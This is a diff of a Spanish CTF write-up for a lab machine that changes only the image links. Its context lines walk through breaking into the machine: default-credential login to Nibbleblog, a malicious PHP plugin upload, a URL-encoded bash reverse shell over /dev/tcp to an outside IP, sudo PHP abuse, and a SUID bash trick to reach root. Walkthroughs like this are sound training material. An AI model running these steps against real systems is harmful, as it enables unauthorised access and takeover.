@@ -16,21 +16,21 @@ Una vez sabemos los puertos que estan abiertos vamos a realizar un escaneo con s
 nmap -p80 -sCV 172.17.0.2 -oN targeted
 ```
 
-![[20250803170335.png]]
+![[20250803170335.png]](chocolate-images/20250803170335.png)
 
 Vemos que el puerto 80 tiene un http así que vamos a ver que hay en la pagina web
 
-![[20250803170407.png]]
+![[20250803170407.png]](chocolate-images/20250803170407.png)
 
 encontramos un index.html del apache lo que no nos dice gran cosa asi que vamos a ver el codigo fuente
 pulsmos Ctrl + U para ver el codigo fuente y encontramos esto :
 
-![[20250803170459.png]]
+![[20250803170459.png]](chocolate-images/20250803170459.png)
 
 vemos un directorio /nibbleblog asi que vamos a ver que esconde este directorio
 
 
-![[20250803170536.png]]
+![[20250803170536.png]](chocolate-images/20250803170536.png)
 
 vemos esto lo que no nos aporta gran cosa asi que vamos a utilizar wfuzz para sacar archivos que esten dentro del nibbbleblog
 
@@ -38,21 +38,21 @@ vemos esto lo que no nos aporta gran cosa asi que vamos a utilizar wfuzz para sa
 wfuzz -c -w /usr/share/wordlists/dirb/common.txt --hc 404 http://172.17.0.2/nibbleblog/FUZZ
 ```
 
-![[20250803170631.png]]
+![[20250803170631.png]](chocolate-images/20250803170631.png)
 
 podemos ver varias rutas interesantes entre ellas content, admin.php. README
 
 vamos a explorarlas un poco 
 
-![[20250803170729.png]]
+![[20250803170729.png]](chocolate-images/20250803170729.png)
 
 Admin.php contiene un panel de login en el que desconocemos las credenciales 
 
 En Readme no hay gran cosa que destacar algo de informacion sobre el creador y poco mas
 
-![[20250803171011.png]]
+![[20250803171011.png]](chocolate-images/20250803171011.png)
 En content como era de esperar vemos contenido de la pagina. donde vemos varias carpetas. voy adelantando que la que nos interesa es private donde encontraremos
-![[20250803171107.png]]
+![[20250803171107.png]](chocolate-images/20250803171107.png)
 
 plugins y users.xml. En users.xml podremos ver el nombre de usuario "admin" pero no hay contraseña
 
@@ -66,20 +66,20 @@ admin:admin123, admin:password, admin:admin
 
 En este caso las credenciales validas son admin:admin por lo que tenemos acceso a la pagina de configuracion de nibbleblog
 
-![[20250803171448.png]]
+![[20250803171448.png]](chocolate-images/20250803171448.png)
 
-![[20250803171517.png]]
+![[20250803171517.png]](chocolate-images/20250803171517.png)
 
 aqui podeis ver a la izquierda las credenciales admin:admin y a la derecha los intentos que estuvo haciendo hydra
 
 ## Fase de Explotacion
 
 Vamos a ir al apartado de plugins
-![[20250803171637.png]]
+![[20250803171637.png]](chocolate-images/20250803171637.png)
 
 y vamos a instalar el plugin About.
 
-![[20250803171658.png]]
+![[20250803171658.png]](chocolate-images/20250803171658.png)
 
 aqui subiremos un archivo con php malicioso que contenga lo siguiente 
 
@@ -89,7 +89,7 @@ aqui subiremos un archivo con php malicioso que contenga lo siguiente
 
 Pulsamos en guardar cambios y saldrán estos errores y abajo pondrá que los cambios se ejecutaron correctamente
 
-![[20250803171818.png]]
+![[20250803171818.png]](chocolate-images/20250803171818.png)
 
 para comprobar si ha funcionado correctamente nuestro php malicioso iremos al directorio 
 
@@ -99,7 +99,7 @@ http://172.17.0.2/nibbleblog/content/private/plugins/about/
 
 y veremos esto
 
-![[20250803171927.png]]
+![[20250803171927.png]](chocolate-images/20250803171927.png)
 
 pulsamos en profile_picture.php
 
@@ -117,7 +117,7 @@ http://172.17.0.2/nibbleblog/content/private/plugins/about/profile_picture.php?c
 etc...
 
 
-![[20250803172122.png]]
+![[20250803172122.png]](chocolate-images/20250803172122.png)
 
 vemos como ha funcionado y tenemos ejecución de comandos asi que vamos a lanzarnos una shell
 
@@ -133,7 +133,7 @@ y en la url de la pagina lanzamos una shell urlencodeada
 172.17.0.2/nibbleblog/content/private/plugins/about/profile_picture.php?fatality=bash -c "bash -i %26>/dev/tcp/192.168.1.182/443 0>%261"
 ```
 
-![[20250803172347.png]]
+![[20250803172347.png]](chocolate-images/20250803172347.png)
 
 y tendremos acceso al sistema como www-data
 
@@ -167,11 +167,11 @@ vamos a realizar el comando
 sudo -l
 ```
 
-![[20250803172627.png]]
+![[20250803172627.png]](chocolate-images/20250803172627.png)
 
 vemos que podemos usar al usuario chocolate sin contraseña para ejecutar el bianrio php asi que vamos a buscar en GTFObins que podemos hacer con eso
 
-![[20250803172709.png]]
+![[20250803172709.png]](chocolate-images/20250803172709.png)
 
 vemos que podemos conseguir una shell como el usuario chocolate asi que vamos a probar
 
@@ -184,7 +184,7 @@ y despues
 ```bash
 sudo -u chocolate php -r "system('$CMD');"
 ```
-![[20250803172837.png]]
+![[20250803172837.png]](chocolate-images/20250803172837.png)
 
 ahí ya tenemos acceso como chocolate ahora vamos a buscar la manera de llegar a root
 
@@ -194,7 +194,7 @@ vamos a utilizar ps para ver los procesos que están ejecutándose en el sistema
 ps -faux
 ```
 
-![[20250803172953.png]]
+![[20250803172953.png]](chocolate-images/20250803172953.png)
 
 aqui vemos que root esta ejecutando /opt/script.php asi que vamos a ver quien tiene permisos sobre ese php
 
@@ -202,7 +202,7 @@ aqui vemos que root esta ejecutando /opt/script.php asi que vamos a ver quien ti
 ls -l /opt/script.php
 ```
 
-![[20250803173050.png]]
+![[20250803173050.png]](chocolate-images/20250803173050.png)
 
 ahi vemos que chocolate tiene permisos de escritura sobre el archivo asi que vamos a inyectarle una orden maliciosa
 
@@ -214,7 +214,7 @@ con esto haremos que el bianrio /bin/bash tenga permisos SUID por lo que podremo
 
 si revisamos el binario /bin/bash podremos ver que ahora tiene permisos SUID
 
-![[20250803173313.png]]
+![[20250803173313.png]](chocolate-images/20250803173313.png)
 
 asi que utilizamos el comando 
 
@@ -222,7 +222,7 @@ asi que utilizamos el comando
 bash -p
 ```
 
-![[20250803173353.png]]
+![[20250803173353.png]](chocolate-images/20250803173353.png)
 
 y ya tendríamos acceso a la maquina como root
 
@@ -304,16 +304,16 @@ vamos a crear un html en nuestro equipo en local.
 
 y ahora con chatGpt crearemos una imagen yo aprovechando que el fondo de pantalla que uso es este
 
-![[20250803175806.png]]
+![[20250803175806.png]](chocolate-images/20250803175806.png)
 
 voy a modificarlo para que quede asi
 
-![[20250803175841.png]]
+![[20250803175841.png]](chocolate-images/20250803175841.png)
 
 y esto sera lo que vera la "victima"
 
 en nuestra maquina atacante crearemos una carpeta que contenga estas 2 cosas 
-![[20250803175927.png]]
+![[20250803175927.png]](chocolate-images/20250803175927.png)
 
 el index.html y la imagen que queramos poner 
 
@@ -347,6 +347,6 @@ Y esto quedaria asi
 
 ## RESULTADO
 
-![[20250803180311.png]]
+![[20250803180311.png]](chocolate-images/20250803180311.png)
 
 la imagen tiene movimiento pero solo puedo dejaros una captura de pantalla os animo a probarlo y compartir vuestros resultados.
